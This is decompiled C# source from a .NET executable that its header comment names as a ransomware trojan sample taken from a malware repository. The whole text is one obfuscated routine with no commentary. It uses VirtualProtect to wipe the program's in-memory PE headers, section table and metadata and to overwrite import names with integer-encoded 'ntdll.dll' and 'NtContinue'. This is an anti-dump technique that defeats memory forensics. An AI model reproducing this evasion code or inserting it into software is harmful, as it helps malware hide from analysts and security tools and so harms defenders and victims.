// Decompiled with JetBrains decompiler
// Type: 蘈鶬ﱢ㕎䏖⋄
// Assembly: uzjSR5XnMreRD, Version=2.6.1.2, Culture=neutral, PublicKeyToken=null
// MVID: 8F87B908-3642-4B60-8D81-E7A9714E6A58
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.Win32.Generic-be1f54130ca8e7a8d44bd431d6f1a31d8166c3a53cb0b94a3217ef4f5cfd47d4.exe

using System;
using System.Runtime.InteropServices;

internal static class 蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4
{
  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect", PreserveSig = false)]
  private static extern unsafe bool 髛덗Ⱐᒄ䂐걛䃴䵰(
    byte* lpAddress,
    int dwSize,
    uint flNewProtect,
    out uint lpflOldProtect);

  public static unsafe void \uFFFDꭥ狔债ȶ뛿愖织()
  {
    byte* hinstance = (byte*) (void*) Marshal.GetHINSTANCE(typeof (蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4).Module);
    byte* numPtr1 = hinstance + 60;
    byte* numPtr2 = hinstance + (int) *(uint*) numPtr1 + 6;
    ushort length = *(ushort*) numPtr2;
    byte* numPtr3 = numPtr2 + 14;
    ushort num1 = *(ushort*) numPtr3;
    byte* numPtr4 = numPtr3 + 4 + (int) num1;
    // ISSUE: untyped stack allocation
    byte* numPtr5 = (byte*) __untypedstackalloc(new IntPtr(11));
    *(int*) numPtr5 = 1818522734;
    *(int*) (numPtr5 + 4) = 1818504812;
    *(short*) (numPtr5 + 8) = (short) 108;
    numPtr5[10] = (byte) 0;
    // ISSUE: untyped stack allocation
    byte* numPtr6 = (byte*) __untypedstackalloc(new IntPtr(11));
    *(int*) numPtr6 = 1866691662;
    *(int*) (numPtr6 + 4) = 1852404846;
    *(short*) (numPtr6 + 8) = (short) 25973;
    numPtr6[10] = (byte) 0;
    if (typeof (蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4).Module.FullyQualifiedName != "<Unknown>")
    {
      uint lpflOldProtect;
      蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(numPtr4 - 16, 8, 64U, out lpflOldProtect);
      *(int*) (numPtr4 - 12) = 0;
      byte* lpAddress1 = hinstance + (int) *(uint*) (numPtr4 - 16);
      *(int*) (numPtr4 - 16) = 0;
      if (*(uint*) (numPtr4 - 120) != 0U)
      {
        byte* numPtr7 = hinstance + (int) *(uint*) (numPtr4 - 120);
        byte* numPtr8 = hinstance + (int) *(uint*) numPtr7;
        byte* lpAddress2 = hinstance + (int) *(uint*) (numPtr7 + 12);
        byte* lpAddress3 = hinstance + (int) *(uint*) numPtr8 + 2;
        蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(lpAddress2, 11, 64U, out lpflOldProtect);
        for (int index = 0; index < 11; ++index)
          lpAddress2[index] = numPtr5[index];
        蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(lpAddress3, 11, 64U, out lpflOldProtect);
        for (int index = 0; index < 11; index++)
          lpAddress3[index] = numPtr6[index];
      }
      for (int index = 0; index < (int) length; index++)
      {
        蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(numPtr4, 8, 64U, out lpflOldProtect);
        Marshal.Copy(new byte[8], 0, (IntPtr) (void*) numPtr4, 8);
        numPtr4 += 40;
      }
      蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(lpAddress1, 72, 64U, out lpflOldProtect);
      byte* lpAddress4 = hinstance + (int) *(uint*) (lpAddress1 + 8);
      *(int*) lpAddress1 = 0;
      *(int*) (lpAddress1 + 4) = 0;
      *(int*) (lpAddress1 + 8) = 0;
      *(int*) (lpAddress1 + 12) = 0;
      蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(lpAddress4, 4, 64U, out lpflOldProtect);
      *(int*) lpAddress4 = 0;
      byte* numPtr9 = lpAddress4 + 12;
      byte* numPtr10 = (byte*) ((ulong) ((uint) (numPtr9 + (int) *(uint*) numPtr9) + 7U) & 18446744073709551612UL) + 2;
      ushort num2 = (ushort) *numPtr10;
      byte* lpAddress5 = numPtr10 + 2;
      for (int index1 = 0; index1 < (int) num2; index1++)
      {
        蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(lpAddress5, 8, 64U, out lpflOldProtect);
        *(int*) lpAddress5 = 0;
        byte* numPtr11 = lpAddress5 + 4;
        *(int*) numPtr11 = 0;
        lpAddress5 = numPtr11 + 4;
        for (int index2 = 0; index2 < 8; ++index2)
        {
          蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(lpAddress5, 4, 64U, out lpflOldProtect);
          *lpAddress5 = (byte) 0;
          byte* numPtr12 = lpAddress5 + 1;
          if (*numPtr12 != (byte) 0)
          {
            *numPtr12 = (byte) 0;
            byte* numPtr13 = numPtr12 + 1;
            if (*numPtr13 != (byte) 0)
            {
              *numPtr13 = (byte) 0;
              byte* numPtr14 = numPtr13 + 1;
              if (*numPtr14 == (byte) 0)
              {
                lpAddress5 = numPtr14 + 1;
                break;
              }
              *numPtr14 = (byte) 0;
              lpAddress5 = numPtr14 + 1;
            }
            else
            {
              lpAddress5 = numPtr13 + 2;
              break;
            }
          }
          else
          {
            lpAddress5 = numPtr12 + 3;
            break;
          }
        }
      }
    }
    else
    {
      uint lpflOldProtect;
      蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(numPtr4 - 16, 8, 64U, out lpflOldProtect);
      *(int*) (numPtr4 - 12) = 0;
      uint num3 = *(uint*) (numPtr4 - 16);
      *(int*) (numPtr4 - 16) = 0;
      uint num4 = *(uint*) (numPtr4 - 120);
      uint[] numArray1 = new uint[(int) length];
      uint[] numArray2 = new uint[(int) length];
      uint[] numArray3 = new uint[(int) length];
      for (int index = 0; index < (int) length; ++index)
      {
        蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(numPtr4, 8, 64U, out lpflOldProtect);
        Marshal.Copy(new byte[8], 0, (IntPtr) (void*) numPtr4, 8);
        numArray1[index] = *(uint*) (numPtr4 + 12);
        numArray2[index] = *(uint*) (numPtr4 + 8);
        numArray3[index] = *(uint*) (numPtr4 + 20);
        numPtr4 += 40;
      }
      if (num4 != 0U)
        goto label_70;
label_52:
      for (int index = 0; index < (int) length; index++)
      {
        if (numArray1[index] < num3 && num3 < numArray1[index] + numArray2[index])
        {
          num3 = num3 - numArray1[index] + numArray3[index];
          break;
        }
      }
      byte* lpAddress6 = hinstance + (int) num3;
      蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(lpAddress6, 72, 64U, out lpflOldProtect);
      uint num5 = *(uint*) (lpAddress6 + 8);
      for (int index = 0; index < (int) length; ++index)
      {
        if (numArray1[index] < num5 && num5 < numArray1[index] + numArray2[index])
        {
          num5 = num5 - numArray1[index] + numArray3[index];
          break;
        }
      }
      *(int*) lpAddress6 = 0;
      *(int*) (lpAddress6 + 4) = 0;
      *(int*) (lpAddress6 + 8) = 0;
      *(int*) (lpAddress6 + 12) = 0;
      byte* lpAddress7 = hinstance + (int) num5;
      蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(lpAddress7, 4, 64U, out lpflOldProtect);
      *(int*) lpAddress7 = 0;
      byte* numPtr15 = lpAddress7 + 12;
      byte* numPtr16 = (byte*) ((ulong) ((uint) (numPtr15 + (int) *(uint*) numPtr15) + 7U) & 18446744073709551612UL) + 2;
      ushort num6 = (ushort) *numPtr16;
      byte* lpAddress8 = numPtr16 + 2;
      for (int index3 = 0; index3 < (int) num6; index3++)
      {
        蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(lpAddress8, 8, 64U, out lpflOldProtect);
        *(int*) lpAddress8 = 0;
        byte* numPtr17 = lpAddress8 + 4;
        *(int*) numPtr17 = 0;
        lpAddress8 = numPtr17 + 4;
        for (int index4 = 0; index4 < 8; index4++)
        {
          蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(lpAddress8, 4, 64U, out lpflOldProtect);
          *lpAddress8 = (byte) 0;
          byte* numPtr18 = lpAddress8 + 1;
          if (*numPtr18 == (byte) 0)
          {
            lpAddress8 = numPtr18 + 3;
            break;
          }
          *numPtr18 = (byte) 0;
          byte* numPtr19 = numPtr18 + 1;
          if (*numPtr19 == (byte) 0)
          {
            lpAddress8 = numPtr19 + 2;
            break;
          }
          *numPtr19 = (byte) 0;
          byte* numPtr20 = numPtr19 + 1;
          if (*numPtr20 != (byte) 0)
          {
            *numPtr20 = (byte) 0;
            lpAddress8 = numPtr20 + 1;
          }
          else
          {
            lpAddress8 = numPtr20 + 1;
            break;
          }
        }
      }
      return;
label_70:
      for (int index = 0; index < (int) length; ++index)
      {
        if (numArray1[index] < num4 && num4 < numArray1[index] + numArray2[index])
        {
          num4 = num4 - numArray1[index] + numArray3[index];
          break;
        }
      }
      byte* numPtr21 = hinstance + (int) num4;
      uint num7 = *(uint*) numPtr21;
      for (int index = 0; index < (int) length; ++index)
      {
        if (numArray1[index] < num7 && num7 < numArray1[index] + numArray2[index])
        {
          num7 = num7 - numArray1[index] + numArray3[index];
          break;
        }
      }
      byte* numPtr22 = hinstance + (int) num7;
      uint num8 = *(uint*) (numPtr21 + 12);
      for (int index = 0; index < (int) length; index++)
      {
        if (numArray1[index] < num8 && num8 < numArray1[index] + numArray2[index])
        {
          num8 = num8 - numArray1[index] + numArray3[index];
          break;
        }
      }
      uint num9 = *(uint*) numPtr22 + 2U;
      for (int index = 0; index < (int) length; index++)
      {
        if (numArray1[index] < num9 && num9 < numArray1[index] + numArray2[index])
        {
          num9 = num9 - numArray1[index] + numArray3[index];
          break;
        }
      }
      蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(hinstance + (int) num8, 11, 64U, out lpflOldProtect);
      for (int index = 0; index < 11; ++index)
        (hinstance + (int) num8)[index] = numPtr5[index];
      蘈鶬ﱢ㕎\uE9C6\uE077䏖\u22C4.髛덗Ⱐᒄ䂐걛䃴䵰(hinstance + (int) num9, 11, 64U, out lpflOldProtect);
      for (int index = 0; index < 11; ++index)
        (hinstance + (int) num9)[index] = numPtr6[index];
      goto label_52;
    }
  }
}
